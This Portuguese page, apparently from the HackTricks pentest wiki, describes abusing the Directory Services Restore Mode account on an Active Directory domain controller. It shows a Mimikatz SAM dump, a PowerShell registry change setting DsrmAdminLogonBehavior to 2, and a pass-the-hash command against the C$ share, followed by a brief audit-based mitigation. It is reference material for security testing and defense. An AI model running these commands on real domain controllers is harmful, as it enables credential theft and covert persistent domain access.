# Credenciais DSRM

{{#include ../../banners/hacktricks-training.md}}

## Informações básicas

Cada controlador de domínio possui uma conta de administrador do Directory Services Restore Mode (DSRM). Sua senha é definida durante a promoção do controlador de domínio e é independente das contas de domínio do Active Directory.<sup>[[1]](#references)</sup>

Um atacante com controle administrativo de um controlador de domínio pode despejar o banco de dados SAM local e recuperar o hash NTLM do administrador do DSRM. O comando Mimikatz a seguir executa essa operação:<sup>[[2]](#references)</sup>
```powershell
Invoke-Mimikatz -Command '"token::elevate" "lsadump::sam"'
```
Por padrão, a conta DSRM destina-se ao modo de restauração. Definir `DsrmAdminLogonBehavior` como `2` permite que essa conta local se autentique enquanto o controlador de domínio está em execução normal. Verifique o valor antes de alterá-lo:<sup>[[2]](#references)[[3]](#references)</sup>
```powershell
$lsaPath = 'HKLM:\SYSTEM\CurrentControlSet\Control\Lsa'
$current = Get-ItemProperty -Path $lsaPath -Name DsrmAdminLogonBehavior -ErrorAction SilentlyContinue

if ($null -eq $current) {
New-ItemProperty -Path $lsaPath -Name DsrmAdminLogonBehavior -Value 2 -PropertyType DWORD
} else {
Set-ItemProperty -Path $lsaPath -Name DsrmAdminLogonBehavior -Value 2
}
```
O hash recuperado pode então ser usado em uma sessão pass-the-hash para acessar recursos como o compartilhamento administrativo `C$`. Para esta conta local, use o nome do computador do controlador de domínio como o valor de `/domain`:<sup>[[3]](#references)</sup>
```powershell
sekurlsa::pth /domain:dc-host-name /user:Administrator /ntlm:b629ad5753f4c441e3af31c97fad8973 /run:powershell.exe
# In the new PowerShell process, access C$ over NTLM.
ls \\dc-host-name\C$
```
## Mitigação

- Audite as alterações em `HKLM:\System\CurrentControlSet\Control\Lsa\DsrmAdminLogonBehavior`. O evento de segurança 4657 registra uma modificação no valor do registro quando a SACL da chave está configurada para auditar operações de **Set Value**.<sup>[[4]](#references)</sup>

## References

- [1] [Microsoft: Redefinir a senha do administrador do Directory Services Restore Mode](https://learn.microsoft.com/en-us/troubleshoot/windows-server/active-directory/reset-directory-services-restore-mode-admin-pwd)
- [2] [ADSecurity: Persistência sorrateira no Active Directory #11 — Directory Service Restore Mode](https://adsecurity.org/?p=1714)
- [3] [ADSecurity: Persistência sorrateira no Active Directory #13 — DSRM Persistence v2](https://adsecurity.org/?p=1785)
- [4] [Microsoft: Evento 4657 — Um valor do registro foi modificado](https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-10/security/threat-protection/auditing/event-4657)
{{#include ../../banners/hacktricks-training.md}}
